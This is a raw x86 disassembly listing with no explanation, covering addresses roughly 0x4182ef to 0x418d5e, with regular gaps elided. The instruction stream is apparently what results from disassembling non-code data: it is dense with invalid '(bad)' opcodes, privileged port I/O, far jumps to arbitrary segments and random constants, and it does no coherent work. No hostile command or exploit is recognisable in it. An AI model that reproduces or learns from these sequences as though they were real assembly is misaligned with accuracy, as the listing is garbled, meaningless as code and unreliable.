  4182ef:	fimul  WORD PTR [esi]
  4182f1:	cmp    al,0x7a
  4182f3:	sub    al,0xfb
  4182f5:	test   BYTE PTR [ebx],ch
  4182f7:	xchg   ebx,eax
  4182f8:	add    BYTE PTR [eax-0x4],0x6f
  4182fc:	pushf  
  4182fd:	std    
  4182fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4182ff:	pop    esi
  418300:	(bad)  
  418301:	dec    ebx
  418302:	mov    ds:0x9cdb5669,eax
  418307:	in     eax,dx
  418308:	int    0x62
  41830a:	mov    bh,0xa5
  41830c:	ins    DWORD PTR es:[edi],dx
  41830d:	adc    al,0xd0
  41830f:	xchg   esi,edi
  418311:	add    ebp,DWORD PTR [edx-0x2814c9cd]
  418317:	pushf  
  418318:	rcl    ebx,1
  41831a:	or     eax,0x56ed821d
  41831f:	add    al,0x30
  418321:	hlt    
  418322:	jl     0x41839d
  418324:	(bad)  
  418325:	lahf   
  418326:	scas   eax,DWORD PTR es:[edi]
  418327:	fcom   QWORD PTR [edi]
  418329:	mov    bl,0x1c
  41832b:	mov    DWORD PTR [ecx],ebp
  41832d:	inc    edi
  41832e:	pop    eax
  41832f:	jge    0x41830d
  418331:	dec    esi
  418332:	jne    0x418354
  418334:	lahf   
  418335:	push   0x4915d057
  41833a:	sbb    BYTE PTR [edx-0x5d],0xa1
  41833e:	xlat   BYTE PTR ds:[ebx]
  41833f:	inc    esi
  418340:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418341:	loope  0x418383
  418343:	sub    eax,DWORD PTR [ecx-0x2c9608c9]
  418349:	lock test al,0x77
  41834c:	xchg   esp,eax
  41834d:	push   ds
  41834e:	dec    ebp
  41834f:	xchg   edi,eax
  418350:	push   esp
  418351:	scas   eax,DWORD PTR es:[edi]
  418352:	mov    dl,0xac
  418354:	jl     0x4182d7
  418356:	das    
  418357:	sbb    al,cl
  418359:	xchg   DWORD PTR [ebx+eax*2],ebp
  41835c:	or     ah,ch
  41835e:	or     esi,DWORD PTR [edx+ecx*8+0x4db7a016]
  418365:	sbb    DWORD PTR [eax+0x90049f4],ebp
  41836b:	mov    esi,0xa2bfad53
  418370:	adc    eax,0xac463937
  418375:	cld    
  418376:	(bad)  
  418377:	aam    0xf5
  418379:	lods   al,BYTE PTR ds:[esi]
  41837a:	out    0xbc,al
  41837c:	push   ds
  41837d:	xchg   edx,eax
  41837e:	push   ebx
  41837f:	sub    DWORD PTR [edx],0xb4019e37
  418385:	push   ss
  418386:	or     BYTE PTR [esi-0x1bc1fae8],bl
  41838c:	daa    
  41838d:	int3   
  41838e:	push   esi
  41838f:	xchg   edx,eax
	...
  4183f4:	fdiv   QWORD PTR [ebx-0x2380afc1]
  4183fa:	(bad)  
  4183fb:	mov    edi,0x14d871ac
  418400:	int    0x6c
  418402:	push   edx
  418403:	daa    
  418404:	xchg   esp,eax
  418405:	add    BYTE PTR [ecx],al
  418407:	add    BYTE PTR [ecx+eax*1],al
  41840a:	add    BYTE PTR [eax],al
  41840c:	xor    ah,BYTE PTR [esp]
  41840f:	lds    edx,FWORD PTR ds:0xa585703b
  418415:	mov    esp,0xa3cbe99f
  41841a:	sub    ch,dh
  41841c:	lock sbb eax,esi
  41841f:	adc    al,0xb
  418421:	(bad)  
  418422:	mov    ah,0x66
  418424:	sub    eax,ebp
  418426:	cmp    ch,cl
  418428:	pop    esp
  418429:	adc    DWORD PTR [eiz*8+0x32d84e23],ecx
  418430:	ret    0xa3de
  418433:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418434:	adc    DWORD PTR ds:0x70c2a0f4,0x51a1240f
  41843e:	sub    edi,ebx
  418440:	jae    0x418431
  418442:	jecxz  0x4184c2
  418444:	xchg   edi,eax
  418445:	(bad)  
  418446:	jmp    0x41840d
  418448:	xchg   esi,eax
  418449:	ins    BYTE PTR es:[edi],dx
  41844a:	pop    ds
  41844b:	idiv   bh
  41844d:	sub    BYTE PTR [edx],ch
  41844f:	sub    BYTE PTR [edx],cl
  418451:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418452:	mov    dh,BYTE PTR [esi+ecx*8-0x6ef7b49a]
  418459:	sbb    ebp,DWORD PTR [esi]
  41845b:	pop    eax
  41845c:	jl     0x418414
  41845e:	mov    cs,WORD PTR [esi+0x514ff1d4]
  418464:	sub    al,0x98
  418466:	inc    ecx
  418467:	push   edx
  418468:	add    eax,0xd2c69e81
  41846d:	dec    esi
  41846e:	jne    0x4184a5
  418470:	fidivr WORD PTR [eax]
  418472:	addr16 jmp 0x5e805892
  418478:	mul    BYTE PTR [ebp+eax*4-0x59]
  41847c:	imul   eax,DWORD PTR [edi+0x60afcade],0x62
  418483:	or     cl,BYTE PTR [ecx+edi*1+0x8]
  418487:	adc    al,0xd
  418489:	repnz lea esi,[ebx-0x2c]
  41848d:	iret   
  41848e:	cs das 
  418490:	xor    ch,BYTE PTR [edx]
  418492:	or     eax,0x6a324953
  418497:	pop    esi
  418498:	daa    
  418499:	adc    BYTE PTR [ecx+0x61],al
  41849c:	xchg   esi,eax
  41849d:	and    al,0x82
  41849f:	adc    DWORD PTR [edx],esp
  4184a1:	fimul  DWORD PTR [ebx-0x395816ee]
  4184a7:	dec    ecx
  4184a8:	push   ss
  4184a9:	ror    DWORD PTR [eax+edx*1-0x69],1
  4184ad:	aam    0xc1
  4184af:	gs mov esp,0xa75f4d75
  4184b5:	sbb    BYTE PTR [ecx-0x41e8ba77],dl
  4184bb:	test   al,0x37
  4184bd:	mov    BYTE PTR [edi+0x23],cl
  4184c0:	retf   
  4184c1:	(bad)  
  4184c2:	call   0xcae6:0xd3285a95
  4184c9:	jo     0x41845f
  4184cb:	cmc    
  4184cc:	dec    eax
  4184cd:	jns    0x4184a4
  4184cf:	mov    ecx,0xb532c375
  4184d4:	adc    bh,dh
  4184d6:	sbb    DWORD PTR [eax+0x40],ebp
  4184d9:	push   esp
  4184da:	fcmovnbe st,st(7)
  4184dc:	mov    cl,0xa3
  4184de:	jle    0x4184d7
  4184e0:	(bad)  
  4184e1:	jle    0x4184e7
  4184e3:	push   0x7a4f1056
  4184e8:	shl    ah,1
  4184ea:	in     eax,0xcf
  4184ec:	icebp  
  4184ed:	xchg   BYTE PTR [esi-0x4880229],ch
  4184f3:	and    DWORD PTR [edi-0x40aa2a31],esi
  4184f9:	jl     0x41848a
  4184fb:	inc    edx
  4184fc:	mov    esi,0xde86c726
  418501:	in     eax,0x99
  418503:	fs pop es
  418505:	ret    0x9073
  418508:	call   0x617f:0xa2e6bade
  41850f:	ret    
	...
  418574:	inc    ecx
  418575:	stc    
  418576:	mov    ebx,ebx
  418578:	mov    ebx,0x26fb51fb
  41857d:	lods   al,BYTE PTR ds:[esi]
  41857e:	imul   dl
  418580:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418581:	mov    edi,0x198ac3b
  418586:	add    DWORD PTR [eax],eax
  418588:	add    al,0x1
  41858a:	add    BYTE PTR [eax],al
  41858c:	add    edx,DWORD PTR [ebx-0x2bd3c8ef]
  418592:	aaa    
  418593:	add    BYTE PTR [eax-0x72],cl
  418596:	(bad)  
  418598:	xchg   edx,eax
  418599:	xchg   ecx,eax
  41859a:	mov    bh,0x17
  41859c:	xor    eax,0xcefba74f
  4185a1:	mov    ch,0x26
  4185a3:	jmp    0x874aff1c
  4185a8:	push   ebx
  4185a9:	ss enter 0x400e,0x57
  4185ae:	test   al,0x7b
  4185b0:	pop    esi
  4185b1:	or     eax,0xe8339968
  4185b6:	mov    DWORD PTR [edx+0x36],eax
  4185b9:	je     0x41857a
  4185bb:	cmp    ecx,DWORD PTR [edi]
  4185bd:	addr16 in al,dx
  4185bf:	or     dl,BYTE PTR [ecx+esi*8-0x73]
  4185c3:	xor    ebp,DWORD PTR [esi]
  4185c5:	bound  edi,QWORD PTR [edi]
  4185c7:	ret    0xd688
  4185ca:	cli    
  4185cb:	mov    edi,0xf4e06de9
  4185d0:	sbb    al,cl
  4185d2:	dec    ebp
  4185d3:	test   DWORD PTR [ebp+0x1c4511ed],0x8f9b3085
  4185dd:	jecxz  0x4185c1
  4185df:	xchg   ecx,eax
  4185e0:	jb     0x418634
  4185e2:	lahf   
  4185e3:	outs   dx,BYTE PTR ds:[esi]
  4185e4:	jno    0x4185c8
  4185e6:	inc    eax
  4185e7:	ins    BYTE PTR es:[edi],dx
  4185e8:	in     al,0xda
  4185ea:	pop    esi
  4185eb:	xor    eax,0x2e54a359
  4185f0:	sbb    edi,esi
  4185f2:	cwde   
  4185f3:	or     eax,0x9e370bc1
  4185f8:	mov    eax,0x9c7b9e30
  4185fd:	and    ch,BYTE PTR [eax]
  4185ff:	test   BYTE PTR ds:0x880a9f10,ch
  418605:	in     al,dx
  418606:	push   ds
  418607:	sbb    eax,0x8d64415
  41860c:	stos   BYTE PTR es:[edi],al
  41860d:	out    dx,eax
  41860e:	push   edi
  41860f:	retf   0x41d1
  418612:	mov    ss,WORD PTR [eax]
  418614:	pop    ebp
  418615:	xchg   edi,eax
  418616:	push   ebx
  418617:	dec    edi
  418618:	inc    ecx
  418619:	pop    ebp
  41861a:	sbb    cl,0xb0
  41861d:	push   ecx
  41861e:	in     al,0x81
  418620:	jnp    0x4185e7
  418622:	and    DWORD PTR [esi-0x3e4fc1e],edi
  418628:	ins    BYTE PTR es:[edi],dx
  418629:	xchg   ecx,eax
  41862a:	add    eax,0xe7d0a2e7
  41862f:	je     0x4185c4
  418631:	cmp    eax,DWORD PTR [ebp+0x1e]
  418634:	jecxz  0x418688
  418636:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418637:	push   esi
  418638:	mov    dh,0xdd
  41863a:	dec    ecx
  41863b:	sti    
  41863c:	pop    eax
  41863d:	pop    ebx
  41863e:	xchg   esp,eax
  41863f:	and    al,0x3a
  418641:	ins    DWORD PTR es:[edi],dx
  418642:	cwde   
  418643:	jae    0x418619
  418645:	rcr    DWORD PTR [eax+0x248e3cd7],1
  41864b:	dec    esi
  41864c:	cmp    al,0x2c
  41864e:	popf   
  41864f:	sbb    al,dh
  418651:	sbb    dh,BYTE PTR [edx]
  418653:	cwde   
  418654:	inc    ecx
  418655:	and    DWORD PTR [esi+0x62],0xa2dbdecd
  41865c:	xchg   edx,eax
  41865d:	mov    dh,0x50
  41865f:	adc    dh,BYTE PTR [edx]
  418661:	mov    ebp,DWORD PTR [edi-0x43]
  418664:	ins    BYTE PTR es:[edi],dx
  418665:	mov    al,0x50
  418667:	push   esp
  418668:	rol    eax,cl
  41866a:	dec    ecx
  41866b:	mov    edi,0x6e2233b9
  418670:	xchg   esp,eax
  418671:	repnz mov esi,esi
  418674:	jmp    0x6473:0xdd8883b4
  41867b:	xor    al,cl
  41867d:	(bad)  
  41867e:	push   ss
  41867f:	out    dx,al
  418680:	cdq    
  418681:	pop    ebx
  418682:	std    
  418683:	iret   
  418684:	fstp   TBYTE PTR [edx+0x667e38ca]
  41868a:	adc    ecx,DWORD PTR [edi+0xf]
  41868d:	inc    esi
  41868e:	mov    al,0x28
	...
  4186f4:	xchg   ebx,eax
  4186f5:	sub    BYTE PTR [eax-0x604344c4],ah
  4186fb:	scas   eax,DWORD PTR es:[edi]
  4186fc:	or     al,0x8d
  4186fe:	cmp    edx,edx
  418700:	in     al,0x29
  418702:	into   
  418703:	jg     0x4186a1
  418705:	add    al,BYTE PTR [ecx]
  418707:	add    BYTE PTR [ecx+eax*1],al
  41870a:	add    BYTE PTR [eax],al
  41870c:	adc    eax,0xea367dda
  418711:	mov    bl,BYTE PTR [eax+eiz*2+0x38cc72e9]
  418718:	popa   
  418719:	enter  0x4938,0x9f
  41871d:	enter  0xb813,0x81
  418721:	mov    eax,0x4f044235
  418726:	or     al,0x1c
  418728:	daa    
  418729:	pushf  
  41872a:	jmp    0x418783
  41872c:	stc    
  41872d:	shr    BYTE PTR [ebp-0x2483bbfe],cl
  418733:	jg     0x4187a5
  418735:	mov    bl,0xef
  418737:	mov    eax,0xcddd93f8
  41873c:	mov    eax,0xb3868361
  418741:	sub    BYTE PTR [esi-0x46],dl
  418744:	xchg   edi,eax
  418745:	sbb    edi,ebp
  418747:	pusha  
  418748:	dec    ebx
  418749:	mov    edi,0x93f7305
  41874e:	lock iret 
  418750:	push   eax
  418751:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418752:	push   cs
  418753:	mov    ebx,0x474a305a
  418758:	or     BYTE PTR [ecx+edi*8-0x62],0x83
  41875d:	stc    
  41875e:	mov    eax,ds:0x98c2b991
  418763:	adc    BYTE PTR [ebx+0x6097936d],al
  418769:	sbb    eax,0x7ad717e4
  41876e:	data16 xor BYTE PTR [edi-0xe],bh
  418772:	je     0x418796
  418774:	fnstcw WORD PTR [ebx+ebx*4+0x334f71c2]
  41877b:	push   0x34
  41877d:	jno    0x4187da
  41877f:	xchg   edx,eax
  418780:	xchg   esp,eax
  418781:	xor    al,bh
  418783:	rol    DWORD PTR [ebx-0x1e467c3e],cl
  418789:	stc    
  41878a:	dec    edx
  41878b:	ds retf 0x19ea
  41878f:	pop    edx
  418790:	cld    
  418791:	jg     0x4187fd
  418793:	sub    dl,ah
  418795:	dec    ebx
  418796:	inc    edx
  418797:	(bad)  
  418798:	or     BYTE PTR [esi-0x7ce34771],dh
  41879e:	aad    0x78
  4187a0:	push   ss
  4187a1:	xor    DWORD PTR [eax+0x26227989],ecx
  4187a7:	ss dec edx
  4187a9:	hlt    
  4187aa:	dec    eax
  4187ab:	outs   dx,BYTE PTR gs:[esi]
  4187ad:	sti    
  4187ae:	or     cl,cl
  4187b0:	cmp    al,0xb1
  4187b2:	popa   
  4187b3:	pop    edi
  4187b4:	xlat   BYTE PTR ds:[ebx]
  4187b5:	push   eax
  4187b6:	ror    bh,1
  4187b8:	mov    ch,0x28
  4187bb:	repz jne 0x418832
  4187be:	xor    esp,edx
  4187c0:	das    
  4187c1:	inc    esp
  4187c2:	sub    ch,BYTE PTR [edi+0x488b5dab]
  4187c8:	or     DWORD PTR [edi+0x29],eax
  4187cb:	mov    ds:0x80f5e549,eax
  4187d0:	popf   
  4187d1:	sbb    eax,0xe3b7e9c0
  4187d6:	inc    edx
  4187d7:	idiv   BYTE PTR cs:[ecx]
  4187da:	cld    
  4187db:	cwde   
  4187dc:	(bad)  
  4187dd:	shl    DWORD PTR [edx-0x472bcb25],0x94
  4187e4:	mov    dl,0x4c
  4187e6:	pusha  
  4187e7:	mov    esp,0x3dd85ac8
  4187ec:	(bad)  [ebx]
  4187ee:	push   0x5fdf6335
  4187f3:	cmp    BYTE PTR [edx-0x37],cl
  4187f6:	sahf   
  4187f7:	rcr    BYTE PTR cs:[esi+ebp*1-0x64506491],cl
  4187ff:	mov    al,ds:0xbdd51fa3
  418804:	call   FWORD PTR [edx-0x31]
  418807:	mov    bl,0x14
  418809:	mov    al,0xcb
  41880b:	inc    edi
  41880c:	sbb    BYTE PTR [edx],bl
  41880e:	push   ecx
  41880f:	xchg   esp,eax
	...
  418874:	xchg   esp,eax
  418875:	enter  0x4337,0x7f
  418879:	push   esp
  41887b:	fbld   TBYTE PTR [esi+0x529c3acd]
  418881:	ja     0x41885c
  418883:	and    BYTE PTR [eax+0x4000103],ah
  418889:	add    DWORD PTR [eax],eax
  41888b:	add    BYTE PTR [edi],al
  41888d:	fsubr  DWORD PTR [edi+0x38c40ee7]
  418893:	mov    ebx,0xfb27deea
  418898:	jle    0x4188fd
  41889a:	test   al,0x7a
  41889c:	or     cl,BYTE PTR [ebx-0x60]
  41889f:	js     0x4188c8
  4188a1:	shr    DWORD PTR [ecx],cl
  4188a3:	mov    ?,WORD PTR [ebx]
  4188a5:	mov    ecx,DWORD PTR [ebx+0xf759643]
  4188ab:	mov    ah,0xe5
  4188ad:	cmp    ecx,DWORD PTR [ebp+0x3b]
  4188b0:	idiv   DWORD PTR [ecx-0x27]
  4188b3:	pop    edx
  4188b4:	and    BYTE PTR [ebx-0x4552123b],dh
  4188ba:	adc    esi,DWORD PTR [esi-0x5fda3f84]
  4188c0:	adc    eax,0x1714d0ba
  4188c5:	xor    ch,BYTE PTR [ebp+0x5f]
  4188c8:	push   edx
  4188c9:	and    DWORD PTR [ebx+0x3b761537],ecx
  4188cf:	je     0x41890b
  4188d1:	xchg   edx,eax
  4188d2:	add    DWORD PTR [esi+0x3ec57ca],ebx
  4188d8:	loopne 0x418921
  4188da:	and    bh,BYTE PTR [eax+0x741c26ac]
  4188e0:	push   ebx
  4188e1:	mov    bh,0x75
  4188e3:	pop    ebx
  4188e4:	mov    dh,0x88
  4188e6:	pushf  
  4188e7:	sbb    edx,edi
  4188e9:	adc    edx,DWORD PTR [edi-0x364d437f]
  4188ef:	push   esi
  4188f0:	push   esi
  4188f1:	(bad)  
  4188f2:	loope  0x418967
  4188f4:	xor    al,0x3d
  4188f6:	ins    BYTE PTR es:[edi],dx
  4188f7:	inc    eax
  4188f8:	xchg   edx,eax
  4188f9:	dec    ebp
  4188fa:	cmc    
  4188fb:	inc    esi
  4188fc:	pop    ebp
  4188fd:	mov    ss,WORD PTR [edi]
  4188ff:	sub    BYTE PTR [edx+0x743d8c50],bh
  418905:	rcr    eax,cl
  418907:	pushf  
  418908:	nop
  418909:	stc    
  41890a:	or     BYTE PTR ds:0x287b91aa,bh
  418910:	lea    eax,[ecx]
  418912:	out    dx,eax
  418913:	outs   dx,DWORD PTR ds:[esi]
  418914:	jnp    0x418942
  418916:	(bad)  
  418917:	loop   0x418959
  418919:	xlat   BYTE PTR ds:[ebx]
  41891a:	jbe    0x418909
  41891c:	stos   BYTE PTR es:[edi],al
  41891d:	hlt    
  41891e:	and    ebp,DWORD PTR [ebp-0x1b8b79a6]
  418924:	fild   QWORD PTR [edx-0x8b5a8d1]
  41892a:	pushf  
  41892b:	imul   DWORD PTR [ebx+eax*8+0x1e]
  41892f:	mov    al,0x4c
  418931:	test   DWORD PTR [eax],ebp
  418933:	imul   edx,eax,0xcadad71f
  418939:	mov    WORD PTR [esi-0x7d],fs
  41893c:	inc    esp
  41893d:	jns    0x41890b
  41893f:	add    al,0x46
  418941:	jno    0x418968
  418943:	adc    eax,0x32493c4e
  418948:	cmovge edi,edi
  41894b:	leave  
  41894c:	add    eax,0x4e31169f
  418951:	dec    edi
  418952:	or     DWORD PTR [ecx-0x4d3e9b43],esi
  418958:	or     dh,BYTE PTR [ebx]
  41895a:	cmp    al,0xed
  41895c:	push   ebp
  41895d:	push   esp
  41895e:	mov    bl,0x55
  418960:	mov    esi,0x452bedb7
  418965:	clc    
  418966:	ds mov fs,eax
  418969:	mov    al,ds:0xd36e96f8
  41896e:	jbe    0x418966
  418970:	arpl   WORD PTR [edi-0x54ced50d],bx
  418976:	mov    bh,0x1f
  418978:	adc    ebx,DWORD PTR [esp+edx*4-0x42]
  41897c:	cld    
  41897d:	add    ah,BYTE PTR [edi]
  41897f:	imul   ecx,DWORD PTR [edx+0x5d],0x45799b70
  418986:	xor    eax,0x1a5cdbf0
  41898b:	call   DWORD PTR [ebx]
  41898d:	aad    0x4f
  41898f:	das    
	...
  4189f4:	mov    WORD PTR [ecx-0x28a2e9ac],ss
  4189fa:	into   
  4189fb:	fwait
  4189fc:	add    bh,cl
  4189fe:	mov    ebp,0x87aca169
  418a03:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  418a05:	add    al,0x1
  418a07:	add    BYTE PTR [ecx+eax*1],al
  418a0a:	add    BYTE PTR [eax],al
  418a0c:	dec    esp
  418a0d:	push   es
  418a0e:	lock mov ecx,0xfec1d413
  418a14:	sub    eax,0x5ff5f897
  418a19:	lods   eax,DWORD PTR ds:[esi]
  418a1a:	pop    esp
  418a1b:	icebp  
  418a1c:	outs   dx,DWORD PTR ds:[esi]
  418a1d:	cmp    DWORD PTR [esi+0x33d60071],esi
  418a23:	pusha  
  418a24:	xor    ebx,DWORD PTR [edi-0x27]
  418a27:	cmp    cl,BYTE PTR [edi]
  418a29:	mov    ax,WORD PTR [edx+0x6f]
  418a2d:	cmp    DWORD PTR [ebx-0x41e71ff7],ecx
  418a33:	push   es
  418a34:	les    ebx,FWORD PTR [ebx+eax*4]
  418a37:	and    eax,eax
  418a39:	xchg   edx,eax
  418a3a:	and    eax,0xb769e2a2
  418a3f:	adc    al,0x4e
  418a41:	jbe    0x4189e5
  418a43:	cmc    
  418a44:	xlat   BYTE PTR ds:[ebx]
  418a45:	push   eax
  418a46:	mov    cl,0xa0
  418a48:	cmp    edi,DWORD PTR [ecx]
  418a4a:	adc    ebx,eax
  418a4c:	lahf   
  418a4d:	ins    BYTE PTR es:[edi],dx
  418a4e:	dec    esp
  418a4f:	mov    cl,0x3e
  418a51:	pusha  
  418a52:	mov    cl,0xb1
  418a54:	mov    DWORD PTR [eax],ecx
  418a56:	aaa    
  418a57:	dec    edx
  418a58:	stos   DWORD PTR es:[edi],eax
  418a59:	push   edi
  418a5a:	xchg   DWORD PTR cs:[edx],ebp
  418a5d:	sbb    ebp,DWORD PTR [ebp+ebp*2-0x6f]
  418a61:	hlt    
  418a62:	mov    eax,0xb279d712
  418a67:	scas   eax,DWORD PTR es:[edi]
  418a68:	pop    ds
  418a69:	repnz cwde 
  418a6b:	outs   dx,DWORD PTR ds:[esi]
  418a6c:	stc    
  418a6d:	xchg   BYTE PTR ds:0x4144d8e8,al
  418a73:	ds add eax,0x84bad8eb
  418a79:	push   ebx
  418a7a:	sub    BYTE PTR [esi+0x5a],dl
  418a7d:	lahf   
  418a7e:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  418a80:	jl     0x418ae5
  418a82:	cmp    esi,DWORD PTR [ebp-0x404a6946]
  418a88:	xchg   edi,eax
  418a89:	scas   eax,DWORD PTR es:[edi]
  418a8a:	lods   al,BYTE PTR ds:[esi]
  418a8b:	jno    0x418a31
  418a8d:	ja     0x418afb
  418a8f:	or     BYTE PTR [ebx],ch
  418a91:	fidiv  WORD PTR [esi+eiz*1+0x6d]
  418a95:	dec    edx
  418a96:	jmp    0x418a42
  418a98:	inc    bp
  418a9a:	mov    esp,0xd11a36e3
  418a9f:	in     eax,0xe7
  418aa1:	mov    edx,0x84a63394
  418aa6:	pop    ss
  418aa7:	mov    ch,0xc5
  418aa9:	mov    dh,0x5e
  418aab:	cmp    edi,DWORD PTR [eax+0x1c722e10]
  418ab1:	fsubr  QWORD PTR [esi+ebp*1]
  418ab4:	and    BYTE PTR [edi-0x2a1a9259],dh
  418aba:	lods   al,BYTE PTR ds:[esi]
  418abb:	outs   dx,BYTE PTR ds:[esi]
  418abc:	mov    ah,0x83
  418abe:	clc    
  418abf:	int3   
  418ac0:	(bad)  
  418ac1:	jmp    0xdabec7d
  418ac6:	lods   al,BYTE PTR ds:[esi]
  418ac7:	call   0x71da:0x49fe0272
  418ace:	inc    edi
  418acf:	mov    bl,0xd7
  418ad1:	pushf  
  418ad2:	sub    dl,dl
  418ad4:	dec    ebp
  418ad5:	rcr    DWORD PTR [eax-0x3d67451],cl
  418adb:	shr    BYTE PTR [esi+0x20fed6e3],0x8b
  418ae2:	push   ebp
  418ae3:	lock mov dh,0xed
  418ae6:	mov    BYTE PTR [esi-0x15],ah
  418ae9:	out    dx,al
  418aea:	add    bl,BYTE PTR [edi+0x70]
  418aed:	push   edi
  418aee:	xor    DWORD PTR [edx-0x66f2a586],edx
  418af4:	imul   eax,DWORD PTR [edx],0x253ae86b
  418afa:	lods   al,BYTE PTR ds:[esi]
  418afb:	aaa    
  418afc:	out    0x1,al
  418afe:	test   dh,al
  418b00:	cli    
  418b01:	and    BYTE PTR [ebx+0x51],dl
  418b04:	or     esi,eax
  418b06:	adc    dh,ah
  418b08:	popf   
  418b09:	pop    ecx
  418b0a:	jecxz  0x418af4
  418b0c:	gs repz mov al,0xa5
	...
  418b74:	jl     0x418b89
  418b76:	test   DWORD PTR [edx],esi
  418b78:	out    dx,eax
  418b79:	mov    dh,0xff
  418b7b:	pop    edi
  418b7c:	sar    BYTE PTR [ebp+0x3b],1
  418b7f:	in     eax,0xa0
  418b81:	or     bl,BYTE PTR [edx+0x105a8a9]
  418b87:	add    BYTE PTR [ecx+eax*1],al
  418b8a:	add    BYTE PTR [eax],al
  418b8c:	shl    ah,0x61
  418b8f:	into   
  418b90:	adc    al,0x5b
  418b92:	add    BYTE PTR [esi+0x58],0x1f
  418b96:	mov    esp,0x3f51f71b
  418b9b:	xor    eax,0x6816a6b2
  418ba0:	sub    ebx,DWORD PTR [ebp+0x4fdc8d52]
  418ba6:	jae    0x418b83
  418ba8:	ret    0xa208
  418bab:	out    0x7c,eax
  418bad:	xchg   edx,eax
  418bae:	ins    DWORD PTR es:[edi],dx
  418baf:	mov    edi,eax
  418bb1:	dec    ebx
  418bb2:	cmp    ah,bh
  418bb4:	mov    edx,0x67bc64c7
  418bb9:	xchg   ebx,eax
  418bba:	xchg   edx,eax
  418bbb:	lods   al,BYTE PTR ds:[esi]
  418bbc:	adc    BYTE PTR [ebx],0x35
  418bbf:	(bad)  
  418bc0:	sar    BYTE PTR [eax+esi*2-0x53],1
  418bc4:	aam    0x5d
  418bc6:	push   eax
  418bc7:	jge    0x418bef
  418bc9:	mov    dl,0x81
  418bcb:	mov    dl,0x56
  418bcd:	mov    ah,0xdf
  418bcf:	in     al,0x6c
  418bd1:	into   
  418bd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418bd3:	test   eax,0x2583c32
  418bd8:	(bad)  
  418bd9:	pop    eax
  418bda:	pop    edx
  418bdb:	lock jae 0x418bf0
  418bde:	push   0x70e68c28
  418be3:	js     0x418c0b
  418be5:	fdivr  DWORD PTR ds:0x5f9800c6
  418beb:	cmc    
  418bec:	and    eax,0x7392b79f
  418bf1:	pop    ds
  418bf2:	jmp    DWORD PTR [ebx+0x7]
  418bf5:	adc    eax,DWORD PTR [ecx-0x5d3cad58]
  418bfb:	xchg   DWORD PTR [eax],edx
  418bfd:	loopne 0x418bf2
  418bff:	pop    esp
  418c00:	dec    ecx
  418c01:	push   edi
  418c02:	jl     0x418c1b
  418c04:	push   es
  418c05:	mov    edi,0xc66e996f
  418c0a:	hlt    
  418c0b:	add    eax,0xdcdb982
  418c10:	fbstp  TBYTE PTR [ecx]
  418c12:	psrlq  mm6,mm7
  418c15:	shl    BYTE PTR [ebx-0x2bb5cfe4],cl
  418c1b:	mov    bl,0x20
  418c1d:	jmp    0x418c81
  418c1f:	jb     0x418c49
  418c21:	pop    ebp
  418c22:	xor    eax,0x91860076
  418c27:	dec    edx
  418c28:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  418c2a:	aam    0x9c
  418c2c:	push   0xfaaaf3b
  418c31:	xor    eax,0xd96d506e
  418c36:	arpl   WORD PTR [ebx],cx
  418c38:	(bad)  [ecx+ebp*1-0x7c]
  418c3c:	xor    bh,BYTE PTR [ebp-0x6d]
  418c3f:	mov    al,BYTE PTR ss:[edi-0x48e8b70f]
  418c46:	sbb    esp,DWORD PTR [ebx+0x54ddf4e4]
  418c4c:	add    DWORD PTR [eax-0x77],edx
  418c4f:	mov    edi,0x11900229
  418c54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418c55:	lods   eax,DWORD PTR ds:[esi]
  418c56:	fild   DWORD PTR [ecx]
  418c58:	jge    0x418be7
  418c5a:	xor    ebx,DWORD PTR ds:0x8f15620
  418c60:	cmp    eax,0xb491a265
  418c65:	xchg   edx,eax
  418c66:	stc    
  418c67:	adc    BYTE PTR [ebx+0x5f],bl
  418c6a:	or     BYTE PTR [edx],dh
  418c6c:	or     dl,BYTE PTR [edi+0x3127b6ab]
  418c72:	mov    dh,0x9d
  418c74:	sti    
  418c75:	xor    esi,0x32
  418c78:	sub    ebp,eax
  418c7a:	rcr    DWORD PTR [edi],0xf8
  418c7d:	add    eax,0xedb173a2
  418c82:	pop    esp
  418c83:	std    
  418c84:	xor    dh,BYTE PTR [edi-0x78]
  418c87:	(bad)  
  418c88:	xor    ah,bh
  418c8a:	pop    es
  418c8b:	push   edi
  418c8c:	dec    ecx
  418c8d:	into   
  418c8e:	jbe    0x418cf1
	...
  418cf4:	sti    
  418cf5:	inc    edx
  418cf6:	out    dx,al
  418cf7:	aas    
  418cf8:	(bad)  
  418cf9:	mov    edi,0x6a1ac6fb
  418cfe:	(bad)  
  418cff:	ror    BYTE PTR [eax+0xa],cl
  418d02:	sbb    ebx,DWORD PTR [eax-0x54]
  418d05:	push   es
  418d06:	add    DWORD PTR [eax],eax
  418d08:	add    al,0x1
  418d0a:	add    BYTE PTR [eax],al
  418d0c:	daa    
  418d0d:	(bad)  
  418d0e:	out    0x30,al
  418d10:	push   ebx
  418d11:	push   ss
  418d12:	mov    eax,ds:0x89bf4e9f
  418d17:	pop    ss
  418d18:	fild   WORD PTR [si-0xf63]
  418d1d:	into   
  418d1e:	dec    edx
  418d1f:	arpl   WORD PTR [edx+edi*2+0x4cb2e8bd],si
  418d26:	push   ecx
  418d27:	in     eax,0x84
  418d29:	call   0xb18b:0xe0d3b5c9
  418d30:	sbb    al,0x0
  418d32:	inc    ebx
  418d33:	add    DWORD PTR [edx-0x75178285],ecx
  418d39:	mov    WORD PTR [edi],si
  418d3c:	or     al,0xc
  418d3e:	push   edx
  418d3f:	gs push ebx
  418d41:	ins    DWORD PTR es:[edi],dx
  418d42:	mov    ds:0x6573420f,al
  418d47:	cmp    DWORD PTR [ebx],esp
  418d49:	mov    al,0x20
  418d4b:	(bad)  
  418d4c:	repnz pushf 
  418d4e:	in     eax,0xbe
  418d50:	stos   DWORD PTR es:[edi],eax
  418d51:	jecxz  0x418d33
  418d53:	add    eax,0x581b612
  418d58:	inc    ecx
  418d59:	mov    esi,0xfdec7882
  418d5e:	iret   
